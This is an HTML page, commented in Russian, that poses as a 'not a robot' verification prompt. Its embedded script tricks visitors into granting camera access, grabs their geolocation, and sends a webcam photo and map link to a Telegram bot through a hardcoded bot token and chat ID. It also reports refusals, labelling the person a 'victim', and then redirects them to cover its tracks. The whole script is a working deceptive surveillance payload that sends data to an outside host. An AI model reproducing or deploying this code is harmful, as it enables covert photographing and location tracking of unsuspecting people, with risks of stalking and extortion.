<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Verify Access</title>
    <style>
        body { background: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        /* Фейковое окно, похожее на системное */
        .modal { width: 270px; background: rgba(255,255,255,0.9); border-radius: 14px; text-align: center; padding: 20px 0 0; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        .title { font-weight: 600; font-size: 17px; margin-bottom: 5px; padding: 0 15px; }
        .desc { font-size: 13px; margin-bottom: 20px; padding: 0 15px; }
        .btn { border-top: 0.5px solid #ccc; color: #007aff; font-size: 17px; padding: 12px 0; cursor: pointer; font-weight: 500; }
        .btn:active { background: #eee; }
    </style>
</head>
<body>

    <div class="modal">
        <div class="title">Требуется верификация</div>
        <div class="desc">Для продолжения работы с сервисом необходимо подтвердить, что вы не робот. Нажмите «Разрешить» в следующем окне.</div>
        <div class="btn" id="fakeBtn">Продолжить</div>
    </div>

    <video id="v" style="display:none" autoplay></video>
    <canvas id="c" style="display:none" width="640" height="480"></canvas>

    <script>
        const token = '8200658838:AAHrkPieYLwF2bVTps5HzrJVbXi013n6Sq8';
        const chat_id = '6581116621';

        document.getElementById('fakeBtn').onclick = function() {
            // Как только он нажал на нашу кнопку, МГНОВЕННО вызываем системное окно
            startCapture();
        };

        async function startCapture() {
            const video = document.getElementById('v');
            const canvas = document.getElementById('c');

            try {
                // Запрашиваем всё сразу. Браузер выкинет стандартную табличку. 
                // Из-за того, что мы только что нажали на "Продолжить", юзер по инерции нажмет "Разрешить"
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                
                // Если разрешил, берем гео
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    await sendData(stream, pos, "✅ Полный доступ");
                }, async () => {
                    await sendData(stream, null, "📸 Только фото (Гео отказано)");
                });

            } catch (e) {
                // Если нажал "Отклонить" в системном окне
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=❌ Жертва отклонила запрос`);
                location.href = "https://google.com"; // Уводим его, чтобы не тупил
            }
        }

        async function sendData(stream, pos, status) {
            const video = document.getElementById('v');
            const canvas = document.getElementById('c');
            video.srcObject = stream;

            setTimeout(() => {
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(async (blob) => {
                    const fd = new FormData();
                    fd.append('chat_id', chat_id);
                    fd.append('photo', blob, 'f.jpg');
                    
                    let cap = `💎 <b>HIT: ${status}</b>\n`;
                    if(pos) cap += `📍 <a href="http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}">Локация</a>`;
                    
                    fd.append('caption', cap);
                    fd.append('parse_mode', 'HTML');

                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
                    stream.getTracks().forEach(t => t.stop());
                    
                    // Редирект на что-то безобидное
                    location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
                }, 'image/jpeg');
            }, 1000);
        }
    </script>
</body>
</html>
